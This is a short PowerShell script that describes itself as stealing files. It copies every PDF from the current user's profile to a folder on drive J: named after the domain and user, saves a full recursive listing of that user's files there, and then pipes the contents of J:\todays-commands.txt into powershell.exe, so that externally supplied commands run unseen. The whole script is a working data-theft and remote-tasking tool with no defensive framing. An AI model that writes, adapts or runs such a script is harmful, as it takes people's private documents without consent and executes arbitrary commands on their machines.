$User=$env:UserName
$Domain=$env:UserDomain
$Storage="J:\$Domain\$User"
cd J:
mkdir $Domain
cd $Domain
mkdir $User
cd $User

# Steal all PDF's
Get-Childitem C:\Users\$User -recurse -filter "*.pdf" | %{Copy-Item -Path $_.FullName -Destination $Storage}

#List all files
Get-ChildItem -Recurse C:\Users\$User > $Storage\Current_File_List.txt

#Launch Today's commands
cat J:\todays-commands.txt | powershell.exe



